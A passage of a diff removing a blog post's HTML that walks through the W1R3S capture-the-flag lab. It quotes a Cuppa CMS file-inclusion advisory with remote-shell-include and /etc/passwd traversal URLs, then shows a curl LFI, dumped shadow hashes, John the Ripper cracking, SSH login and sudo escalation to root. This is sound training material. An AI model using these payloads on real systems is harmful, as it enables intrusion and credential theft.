-<p><img class="center" src="/images/pentest/w1r3s/cuppa-admin.png" title="&lsquo;cuppa admin&rsquo; &lsquo;cuppa admin&rsquo;" ></p>
-
-<p>I&rsquo;ve never heard of this CMS before, I ran a quick searchsploit and got a hit:</p>
-
-<p>```
-searchsploit cuppa cms</p>
-
-<hr />
-
-<p> Exploit Title                                                                                              |  Path</p>
-
-<pre><code>                                                                                                        | (/usr/share/exploitdb/)
-</code></pre>
-
-<hr />
-
-
-
-<hr />
-
-<p>```</p>
-
-<p>Let&rsquo;s see what this is about:</p>
-
-<p>```</p>
-
-<h6>#</h6>
-
-<p>VULNERABILITY: PHP CODE INJECTION</p>
-
-<h6>#</h6>
-
-<p>/alerts/alertConfigField.php (LINE: 22)</p>
-
-<hr />
-
-<p>LINE 22:</p>
-
-<pre><code>    &lt;?php include($_REQUEST["urlConfig"]); ?&gt;
-</code></pre>
-
-<hr />
-
-<h6>#</h6>
-
-<p>DESCRIPTION</p>
-
-<h6>#</h6>
-
-<p>An attacker might include local or remote PHP files or read non-PHP files with this vulnerability. User tainted data is used when creating the file name that will be included into the current file. PHP code in this file will be evaluated, non-PHP code will be embedded to the output. This vulnerability can lead to full server compromise.</p>
-
-<p><a href="http://target/cuppa/alerts/alertConfigField.php?urlConfig=">http://target/cuppa/alerts/alertConfigField.php?urlConfig=</a>[FI]</p>
-
-<h6>#</h6>
-
-<p>EXPLOIT</p>
-
-<h6>#</h6>
-
-<p><a href="http://target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt?">http://target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt?</a></p>
-
-<p><a href="http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd">http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd</a></p>
-
-<p>Moreover, We could access Configuration.php source code via PHPStream</p>
-
-<p>For Example:</p>
-
-<hr />
-
-<p><a href="http://target/cuppa/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php">http://target/cuppa/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php</a></p>
-
-<hr />
-
-<p>```</p>
-
-<h2>Phase 4: LIVE RUN</h2>
-
-<p>I tried the LFI, but all I got was a blank page in return. So I attempted this with curl, and got served the <em>passwd</em> file:</p>
-
-<p><code>
-curl http://192.168.145.134/administrator/alerts/alertConfigField.php --data-urlencode urlConfig=../../../../../../../../../etc/passwd
-[...]
-w1r3s:x:1000:1000:w1r3s,,,:/home/w1r3s:/bin/bash
-[...]
-</code></p>
-
-<p>Now we have a valid user on the system and we can read arbitrary files. Because the root user was prepopulated in the installation page, I tried reading the <em>/etc/shadow</em> file and&hellip;succeeded!</p>
-
-<p><code>
-root:$6$vYcecPCy$JNbK.hr7HU72ifLxmjpIP9kTcx./ak2MM3lBs.Ouiu0mENav72TfQIs8h1jPm2rwRFqd87HDC0pi7gn9t7VgZ0:17554:0:99999:7:::
-www-data:$6$8JMxE7l0$yQ16jM..ZsFxpoGue8/0LBUnTas23zaOqg2Da47vmykGTANfutzM8MuFidtb0..Zk.TUKDoDAVRCoXiZAH.Ud1:17560:0:99999:7:::
-w1r3s:$6$xe/eyoTx$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb/io7x9q1iP.:17567:0:99999:7:::
-</code></p>
-
-<p>That was a lucky break! I put the hashes for root and w1r3s in a file to be cracked by John the Ripper and immediately got a password:</p>
-
-<p><code>
-john hashes.txt
-Created directory: /root/.john
-Warning: detected hash type "sha512crypt", but the string is also recognized as "crypt"
-Use the "--format=crypt" option to force loading these as that type instead
-Using default input encoding: UTF-8
-Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
-Press 'q' or Ctrl-C to abort, almost any other key for status
-computer         (w1r3s)
-</code></p>
-
-<p>With this, I could SSH in.</p>
-
-<p>```
-ssh <a href="&#x6d;&#x61;&#x69;&#108;&#116;&#x6f;&#x3a;&#119;&#49;&#x72;&#x33;&#x73;&#64;&#x31;&#57;&#x32;&#x2e;&#49;&#x36;&#56;&#46;&#49;&#52;&#x35;&#46;&#x31;&#51;&#x34;">&#x77;&#49;&#114;&#51;&#115;&#64;&#49;&#57;&#x32;&#x2e;&#49;&#x36;&#x38;&#x2e;&#49;&#x34;&#x35;&#46;&#49;&#51;&#52;</a>
-The authenticity of host &lsquo;192.168.145.134 (192.168.145.134)&rsquo; can&rsquo;t be established.
-ECDSA key fingerprint is SHA256:/3N0PzPMqtXlj9QWJFMbCufh2W95JylZ/oF82NkAAto.
-Are you sure you want to continue connecting (yes/no)? yes</p>
-
-<h2>Warning: Permanently added &lsquo;192.168.145.134&rsquo; (ECDSA) to the list of known hosts.</h2>
-
-<h2>Think this is the way?</h2>
-
-<h2>Well,&hellip;&hellip;..possibly.</h2>
-
-<p><a href="&#109;&#97;&#105;&#108;&#116;&#x6f;&#58;&#x77;&#x31;&#x72;&#x33;&#115;&#64;&#x31;&#57;&#50;&#46;&#49;&#x36;&#x38;&#x2e;&#49;&#52;&#53;&#46;&#x31;&#x33;&#52;">&#119;&#x31;&#x72;&#51;&#x73;&#x40;&#49;&#x39;&#x32;&#x2e;&#x31;&#54;&#56;&#46;&#49;&#52;&#x35;&#46;&#49;&#x33;&#x34;</a>&rsquo;s password:
-Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.13.0-36-generic x86_64)</p>
-
-<ul>
-<li>Documentation:  <a href="https://help.ubuntu.com">https://help.ubuntu.com</a></li>
-<li>Management:     <a href="https://landscape.canonical.com">https://landscape.canonical.com</a></li>
-<li>Support:        <a href="https://ubuntu.com/advantage">https://ubuntu.com/advantage</a></li>
-</ul>
-
-
-<p>227 packages can be updated.
-11 updates are security updates.</p>
-
-<p><strong><em> System restart required </em></strong>
-&hellip;..You made it huh?&hellip;.
-Last login: Mon Jan 22 22:47:27 2018 from 192.168.0.35
-```</p>
-
-<p>One of the things I picked up from watching <a href="https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA">Ippsec</a> videos was to check the sudo privileges early on:</p>
-
-<p>```
-sudo -l
-sudo: unable to resolve host W1R3S
-[sudo] password for w1r3s:
-Matching Defaults entries for w1r3s on W1R3S:</p>
-
-<pre><code>env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
-</code></pre>
-
-<p>User w1r3s may run the following commands on W1R3S:</p>
-
-<pre><code>(ALL : ALL) ALL
-</code></pre>
-
-<p>```</p>
-
-<p>That tops the misconfiguration list! Our user has unlimited sudo privileges!</p>
-
-<p>```
-w1r3s@W1R3S:~$ sudo /bin/bash
-sudo: unable to resolve host W1R3S
-root@W1R3S:~# ls /root
-flag.txt</p>
-
-<h2>root@W1R3S:~# cat /root/flag.txt</h2>
-
-<hr />
-
-<p>  / <strong><em>/ _ \| \ | |/ </em></strong>|  _ \    / \|<em>   </em>| | | | |      / \|<em>   </em>|<em> </em>/ _ \| \ | / <strong><em>|
- | |  | | | |  \| | |  </em>| |_) |  / _ \ | | | | | | |     / _ \ | |  | | | | |  \| _</strong> \
- | |<strong>| |<em>| | |\  | |</em>| |  _ &lt;  / </strong><em> \| | | |</em>| | |<strong><em> / </em></strong> \| |  | | |<em>| | |\  |</em><strong>) |
-  _</strong><em>___/|</em>| _|_<strong><em>|</em>| _\/_/   __|  _</strong>/|<em><strong><em><em>/</em>/   __| |</em></strong>___/|</em>| _|____/</p>
-
-<hr />
-
-<pre><code>                      .-----------------TTTT_-----_______
-                    /''''''''''(______O] ----------____  \______/]_
- __...---'"""\_ --''   Q                               ___________@
-</code></pre>
-
-<p> |&lsquo;&rsquo;&lsquo;                   .<em>   </em><strong><em><em>__________=&mdash;&mdash;&mdash;&mdash;&ndash;&ldquo;&rdquo;&ldquo;&rdquo;&ldquo;&rdquo;&ldquo;
- |                ..&mdash;&rsquo;&lsquo;|   l L |</em>l   |
- |          ..&mdash;&rsquo;&lsquo;      .  /&ndash;</em></strong>j &rsquo;   &lsquo;
- |    ..&mdash;&rsquo;&lsquo;           /  ,       &rsquo;   &lsquo;
- |&mdash;&rsquo;&lsquo;                /           `    \</p>
-
-<pre><code>                  L__'         \    -
-                                -    '-.
-                                 '.    /
-                                   '-./
-</code></pre>
-
-<hr />
-
-<p>  YOU HAVE COMPLETED THE</p>
-
-<pre><code>           __      __  ______________________   _________
-          /  \    /  \/_   \______   \_____  \ /   _____/
-          \   \/\/   / |   ||       _/ _(__  &lt; \_____  \
-           \        /  |   ||    |   \/       \/        \
-            \__/\  /   |___||____|_  /______  /_______  /.INC
-                 \/                \/       \/        \/        CHALLENGE, V 1.0
-</code></pre>
-
-<hr />
-
-<p>CREATED BY SpecterWires</p>
-
-<hr />
-
-<p>```</p>
-
-<h2>Phase 5: REPORT</h2>
-
-<p>The exploitation chain was as follows:</p>
-
-<ul>
-<li>enumeration revealed the Cuppa CMS directories</li>
-<li>Cuppa CMS was vulnerable to a LFI exploit</li>
-<li>due to the CMS being configured as root, it was possible to read the <em>/etc/shadow</em> file with the LFI</li>
-<li>hash was cracked for standard user <em>w1r3s</em></li>
-<li>the user had unlimited sudo privileges and elevating to root was achieved</li>
-</ul>
-
-
-<p>Until next time!</p>
-
-<p>```</p>
-
-<hr />
-
-<p>/ You&rsquo;ll never be the man your mother \</p>
-
-<h2>\ was!                                /</h2>
-
-<pre><code>         \   ^__^
-            \  (oo)\_______
-                 (__)\       )\/\
-                         ||----w |
-                         ||     ||
 </code></pre>
 
 <p>```</p>
